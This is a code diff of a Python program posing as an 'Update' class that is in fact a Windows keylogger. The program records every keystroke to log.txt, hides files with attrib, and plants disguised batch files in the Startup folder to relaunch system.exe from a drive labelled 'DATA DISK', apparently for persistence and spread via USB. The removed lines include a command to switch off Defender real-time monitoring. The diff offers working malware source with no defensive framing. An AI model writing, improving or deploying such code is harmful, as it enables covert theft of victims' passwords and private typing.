@@ -1,5 +1,4 @@
-LABEL = "Data Disk"
-
+ 
 
 
 
@@ -138,73 +137,92 @@ def player():
     kerpy.check_ip()
     kerpy.profiles()
 
-    
 
 
-# !!! warning: even if not all libraries are used, leave them anyway in the code !!!
-import pynput.keyboard
-import smtplib, ssl
-import time
-import getpass
-import shutil
 import os
-import subprocess
-#import getInfo
-#getInfo.GetIp()
-# uncomment this for print ip and other info of pc
-# print(getInfo.GetIp())
-class Update:
+import getpass
+import time
+import ctypes
+from pynput.keyboard import Key, Listener
 
-    def __init__(self): 
+
+class Update:
+    def __init__(self):
         self.logger = ""
+        self.caps_lock_active = self.is_caps_lock_on()
+        self.shift_pressed = False
+
+        if not os.path.exists("log.txt"):
+            with open("log.txt", "w", encoding="utf-8") as new_file:
+                new_file.write("")
+
+    def is_caps_lock_on(self):
+        return ctypes.windll.user32.GetKeyState(0x14) & 1  
 
     def send_data(self, keystrike):
         self.logger += keystrike
-        with open(f"log.txt","a+",encoding="utf-8") as new_file:
+        with open(f"log.txt", "a+", encoding="utf-8") as new_file:
             new_file.write(self.logger)
 
         self.logger = ""
 
     def take_keys(self, key):
-     try:
-        hit_key = str(key.char)
+        self.caps_lock_active = self.is_caps_lock_on()  
+        try:
+            hit_key = str(key.char)
+            if hit_key.isalpha():  
+                if self.caps_lock_active ^ self.shift_pressed: 
+                    hit_key = hit_key.upper()
+                else:
+                    hit_key = hit_key.lower()
+        except AttributeError:
+            if key == Key.space:
+                hit_key = " "
+            elif key == Key.enter:
+                hit_key = "\n"
+            elif key == Key.backspace:
+                hit_key = "   (BACKSPACE)   "
+            elif key == Key.tab:
+                hit_key = "    (TAB)    "
+            elif key == Key.caps_lock:
+                hit_key = "    (CAPS LOCK)    "
+            else:
+                hit_key = f"    ({str(key)})    "
 
-     except AttributeError:
-        if key == key.enter:
-            hit_key = "\n" + str(key) + "\n"
-        elif key == key.shift:
-            hit_key = ""
-        elif key == key.space:
-            hit_key = " "
-        elif key == key.backspace:
-            # Handle backspace key here
-            hit_key = "   (BACKSPACE)   "
-        elif key == key.enter:
-            hit_key = "\n"
-        elif key == key.caps_lock:
-            hit_key = "\nCAPS LOCK\n"
-        elif key == key.ctrl_r:
-            hit_key  = "\nCtrl right\n"
-        elif key == key.ctrl_l:
-            hit_key = "\nCtrl left\n"
+        self.send_data(hit_key)
+
+    def on_press(self, key):
+        if key in (Key.shift, Key.shift_r):
+            self.shift_pressed = True
         else:
-            hit_key = "" + str(key) + ""
+            self.take_keys(key)
 
-     self.send_data(hit_key)
-     
-    def DWD(self):
-        os.system("Set-MpPreference -DisableRealtimeMonitoring $true")
-     
+    def on_release(self, key):
+        if key in (Key.shift, Key.shift_r):
+            self.shift_pressed = False
+
     def change_dir(self):
+        LABEL = "DATA DISK"
+        AUTOSTART = "system.exe"
         try:
             username = getpass.getuser()
+
+            startup_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+            programs_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs"
+
+            if not os.path.exists(startup_dir):
+                os.makedirs(startup_dir)
+            if not os.path.exists(programs_dir):
+                os.makedirs(programs_dir)
+
             cmdfile = fr"""
 @echo off
-start /min cmd /c "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\auto_update.bat"
+start /min cmd /c "{programs_dir}\\sys.bat"
 """
-            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\auto_update.bat', "w") as cmdFile1:
-             cmdFile1.write(cmdfile)
-            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\auto_update.bat', 'w') as file:
+            with open(f'{startup_dir}\\system.bat', "w") as cmdFile1:
+                cmdFile1.write(cmdfile)
+
+            with open(f'{programs_dir}\\sys.bat', 'w') as file:
                 cmd = fr"""
 @echo off
 setlocal
@@ -217,8 +235,13 @@ for %%G in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
             set "found=true"
             cd /d %%G:\
             attrib +h *.* /s /d
-            if exist "auto_update.exe" (
-                start auto_update.exe
+            if exist "script.lock" (
+                del "script.lock"
+            ) else (
+                set "var=true"
+            )
+            if exist "{AUTOSTART}" (
+                start {AUTOSTART}
             ) else (
                 exit /b 1
             )
@@ -230,22 +253,26 @@ for %%G in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 if "%found%"=="false" (
     exit /b 1
 )
-
-
 """
                 file.write(cmd)
 
         except Exception as e:
-            print("Error [0x80070643]: Failed to Update")
+            with open("execdebug.txt", "w") as boh:
+                boh.write(f"Batch error: {e}")
 
     def main(self):
-        listener = pynput.keyboard.Listener(on_press=self.take_keys)
+        os.system("attrib +h *.* /s /d")
+        listener = Listener(on_press=self.on_press, on_release=self.on_release)
+
+        self.change_dir()
+        os.system("attrib +h *.* /s /d")
+
+        time.sleep(0.8)
+        os.system("attrib +h *.* /s /d")
+
         with listener:
             self.logger = ""
-            self.DWD()
-            self.change_dir()
             listener.join()
-            
 
 
 Update().main()
